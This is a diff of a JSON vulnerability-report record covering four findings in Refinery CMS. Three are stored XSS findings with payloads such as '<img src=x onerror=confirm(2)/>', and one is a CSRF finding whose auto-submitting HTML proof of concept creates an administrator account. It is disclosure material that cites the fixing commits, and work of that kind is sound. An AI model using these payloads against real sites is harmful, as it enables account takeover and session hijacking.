@@ -1,23 +1,85 @@
-
-"report": {recordCollection.report}
 {
-"finding_dict": {
-"pt-rcms-001" : {
-  "identifier": "pt-rcms-001",
-  "title": "stored xss in the title text in the image upload",
-  "risk": "medium",
-  "description": "it seems that the display engine i.e. wysiwyg used in the refinery cms is not properly sanitizing the html entities before displaying them on the page. this issue is addressed in the github. https://github.com/refinery/refinerycms/issues/3097 the commit link which fixed the issue. https://github.com/refinery/refinerycms/commit/ed05cf9ccb4cb1603e62d99b40af097993fba4e4 the steps to produce the vulnerability are 1. log in the refinery cms. 2. go to image tabs. 3. click on add new image. 4. select an image to upload. 5. in the title box insert the xss payload. 6. write anything in the alt box. 7. click on save button. 8. move mouse pointer over the info icon found below the uploaded image. 9. we can see that the xss payload gets executed. the xss payload used '<marquee onscroll=confirm(1)>xss'5 | p a g e the below image shows the vulnerable fields. these images shows the payload and the xss in action.6 | p a g e the xss payload being executed.7 | p a g e"
-},
-"pt-rcms-002" : {
-  "identifier": "pt-rcms-002",
-  "title": "stored xss in the alt text in the image upload",
-  "risk": "medium",
-  "description": "this vulnerability is same as pt-rcms-001 but in a different location. this issue is addressed in the github https://github.com/refinery/refinerycms/issues/3097 the commit link which fixed the issue. https://github.com/refinery/refinerycms/commit/ed05cf9ccb4cb1603e62d99b40af097993fba4e4 the steps to produce the vulnerability are 1. log in the refinery cms. 2. go to image tabs. 3. click on add new image. 4. select an image to upload. 5. write anything in the title box. 6. in the alt box insert the xss payload. 7. click on save button. 8. move mouse pointer over the info icon found below the uploaded image. 9. we can see that the xss payload gets executed. the xss payload used '<marquee onscroll=confirm(2)>xss' the below image shows the payload.8 | p a g e the below image shows the execution of xss payload9 | p a g e"
-},
-"pt-rcms-003" : {
-  "identifier": "pt-rcms-003",
-  "title": "stored xss in the title of the add new page",
-  "risk": "medium",
-  "description": "this issue is addressed in the github. https://github.com/refinery/refinerycms/issues/3097 the steps to produce the vulnerability are 1. log in the refinery cms. 2. go to pages tabs. 3. click on add new page. 4. insert the xss payload in the title box. 5. write anything in the body. 6. click on save button. 7. open the saved pages in the new browser window and we can see that the xss payload gets executed. the xss payload used <img src=x onerror=confirm(2)/> the xss vulnerable field is shown in below image. the below image shows the payload.10 | p a g e the below image shows the payload in action.11 | p a g e"
-}}
+  "report": "Refinery-CMS.pdf",
+  "finding_dict": {
+    "pt-rcms-001": {
+      "identifier": "pt-rcms-001",
+      "title": "Stored XSS in Image Upload Title Field",
+      "severity": "medium",
+      "description": "Refinery CMS before version 3.0.0 is vulnerable to Stored Cross-Site Scripting (XSS) when uploading images. The application fails to sanitize the title attribute of an image properly. An attacker can inject malicious JavaScript into the title field, which is then executed when an user hovers over the info icon of the image in the admin interface. This occurs because the title text is rendered without proper HTML entity encoding in the display engine used by the CMS.",
+      "github_issue_url": "https://github.com/refinery/refinerycms/issues/3097",
+      "github_commit_url": "https://github.com/refinery/refinerycms/commit/ed05cf9ccb4cb1603e62d99b40af097993fba4e4",
+      "steps_to_reproduce": [
+        "Log in to the Refinery CMS admin dashboard.",
+        "Navigate to the 'Images' tab.",
+        "Click on 'Add new image'.",
+        "Select an image file for upload.",
+        "Enter the payload `<marquee onscroll=confirm(1)>xss` into the 'Title' input box.",
+        "Enter arbitrary text into the 'Alt text' box.",
+        "Click the 'Save' button to upload the image.",
+        "Once uploaded, locate the image in the gallery and move the mouse pointer over the 'info' icon below the image."
+      ],
+      "payload": "<marquee onscroll=confirm(1)>xss",
+      "poc": "1. Log in to the Refinery CMS admin interface.\n2. Go to the \"Images\" tab and click \"Add new image\".\n3. Upload an image.\n4. In the \"Title\" field, input the payload: <marquee onscroll=confirm(1)>xss\n5. Fill the \"Alt\" field with any text and save the image.\n6. Hover over the information icon located below the image thumbnail in the gallery view.\n7. The script will execute.",
+      "impact": "Successful exploitation allows an attacker to execute arbitrary JavaScript in the context of the victim's session. This could lead to information disclosure, session hijacking, or unauthorized administrative actions."
+    },
+    "pt-rcms-002": {
+      "identifier": "pt-rcms-002",
+      "title": "Stored XSS in Image Alt Text - Refinery CMS",
+      "severity": "medium",
+      "description": "A stored cross-site scripting (XSS) vulnerability exists in the image upload functionality of Refinery CMS. The application fails to properly sanitize the 'alt text' field when uploading an image. When an administrator hovers over the info icon of the uploaded image in the library, the unsanitized alt text is rendered, allowing any embedded JavaScript to execute in the context of the user's browser. This issue is similar to pt-rcms-001 but occurs within the image management module.",
+      "github_issue_url": "https://github.com/refinery/refinerycms/issues/3097",
+      "github_commit_url": "https://github.com/refinery/refinerycms/commit/ed05cf9ccb4cb1603e62d99b40af097993fba4e4",
+      "steps_to_reproduce": [
+        "Log in to the Refinery CMS administrative interface.",
+        "Navigate to the 'Images' tab.",
+        "Click on 'Add New Image'.",
+        "Select an image file to upload.",
+        "Enter a title for the image.",
+        "In the 'Alt' text field, enter the payload: <marquee onscroll=confirm(2)>xss",
+        "Click the 'Save' button.",
+        "Locate the uploaded image in the library and hover the mouse pointer over the 'info' icon below it."
+      ],
+      "payload": "<marquee onscroll=confirm(2)>xss",
+      "poc": "1. Log in to the Refinery CMS administrative interface.\n2. Navigate to the 'Images' tab and click 'Add New Image'.\n3. Select any valid image file.\n4. Provide a standard title, but in the 'Alt' text field, insert the payload: <marquee onscroll=confirm(2)>xss\n5. Save the image.\n6. In the image grid view, hover the mouse pointer over the 'info' icon located beneath the newly uploaded image.\n7. The payload will execute, triggering a confirmation dialog.",
+      "impact": "Successful exploitation allows an attacker to execute arbitrary scripts in the context of another user's session, typically an administrator. This can lead to session hijacking, unauthorized access to sensitive data, or performing administrative actions without consent."
+    },
+    "pt-rcms-003": {
+      "identifier": "pt-rcms-003",
+      "title": "Stored XSS in Page Title field",
+      "severity": "medium",
+      "description": "Refinery CMS before versions 2.1.5 and 3.0.0.rc2 is vulnerable to Stored Cross-Site Scripting (XSS) via the page title field. When creating a new page, an attacker can input a malicious JavaScript payload into the 'Title' field. This script is then saved to the database and executed whenever the page title is rendered on the frontend or within the administrative interface, as the input is not sufficiently sanitized before being displayed.",
+      "github_issue_url": "https://github.com/refinery/refinerycms/issues/3097",
+      "github_commit_url": "https://github.com/refinery/refinerycms/commit/a4755a71a0670836528d9c2409559fc2721f478c",
+      "steps_to_reproduce": [
+        "Log in to the Refinery CMS.",
+        "Go to the Pages tab.",
+        "Click on \"Add new page\".",
+        "Insert the XSS payload <img src=x onerror=confirm(2)/> in the title box.",
+        "Write anything in the body.",
+        "Click on the \"Save\" button.",
+        "Open the saved page in a new browser window to see the payload execute."
+      ],
+      "payload": "<img src=x onerror=confirm(2)/>",
+      "poc": "1. Log in to the Refinery CMS.\n2. Navigate to the \"Pages\" section.\n3. Click on \"Add new page\".\n4. In the \"Title\" field, enter the following payload: <img src=x onerror=confirm(2)/>\n5. Enter any text in the page body and click \"Save\".\n6. View the newly created page on the website to trigger the XSS.",
+      "impact": "Successful exploitation allows an attacker to execute arbitrary JavaScript in the context of any user who views the affected page. This can lead to session hijacking, unauthorized actions on behalf of the user, and theft of sensitive information. If an administrator views the page, the attacker could potentially gain full control over the CMS."
+    },
+    "pt-rcms-004": {
+      "identifier": "pt-rcms-004",
+      "title": "Cross-Site Request Forgery on Multiple Events in Refinery-CMS",
+      "severity": "high",
+      "description": "Refinery-CMS was found to be vulnerable to Cross-Site Request Forgery (CSRF). During testing, it was discovered that the anti-CSRF token (authenticity_token) used in various forms was not properly verified by the backend. The application would process requests even when the authenticity_token field was left blank. This flaw allows an attacker to perform unauthorized actions on behalf of a logged-in user, particularly administrators. The fix involved explicitly adding `protect_from_forgery with: :exception` to the base controllers to ensure all state-changing requests are validated.",
+      "github_issue_url": "https://github.com/refinery/refinerycms/issues/3098",
+      "github_commit_url": "https://github.com/refinery/refinerycms/commit/9fd5a8b5e98827431add4a4c997286f10092cb9c",
+      "steps_to_reproduce": [
+        "Login to the Refinery-CMS administrative interface.",
+        "As the logged-in administrator, open a specially crafted HTML file containing the CSRF POC.",
+        "The HTML form points to the user creation or management endpoint (e.g., /refinery/users).",
+        "The form is automatically submitted via JavaScript with a blank 'authenticity_token'.",
+        "Verify that the action (e.g., account creation) was successfully performed by the server despite the missing token."
+      ],
+      "payload": "authenticity_token=",
+      "poc": "<html> <!-- csrf poc - add new account --> <body> <form name=\"csrf\" id=\"csrf\" action=\"http://localhost:3000/refinery/users\" method=\"patch\"> <!-- change the action value according to the server--> <input type=\"hidden\" name=\"utf8\" value=\"a\\x9c\\x93\" /> <input type=\"hidden\" name=\"authenticity_token\" value=\"\" /> <input type=\"hidden\" name=\"user[username]\" value=\"csrf\" /> <input type=\"hidden\" name=\"user[full_name]\" value=\"csrf\" /> <input type=\"hidden\" name=\"user[email]\" value=\"csrf@csrf.com\" /> <input type=\"hidden\" name=\"user[password]\" value=\"csrf\" /> <input type=\"hidden\" name=\"user[password_confirmation]\" value=\"csrf\" /> <input type=\"hidden\" name=\"user[plugins][]\" value=\"refinery_files\" /> <input type=\"hidden\" name=\"user[plugins][]\" value=\"refinery_images\" /> <input type=\"hidden\" name=\"user[plugins][]\" value=\"refinery_pages\" /> <input type=\"hidden\" name=\"user[plugins][]\" value=\"refinery_authentication_devise\" /> <input type=\"submit\" value=\"submit form\" /> </form> <script>document.getElementById(\"csrf\").submit();</script> </body> </html>",
+      "impact": "Successful exploitation of this vulnerability allows an attacker to perform administrative actions, such as creating new administrator accounts, deleting existing users, or modifying site content, without the administrator's knowledge. This leads to full compromise of the CMS application."
+    }
+  }
 }
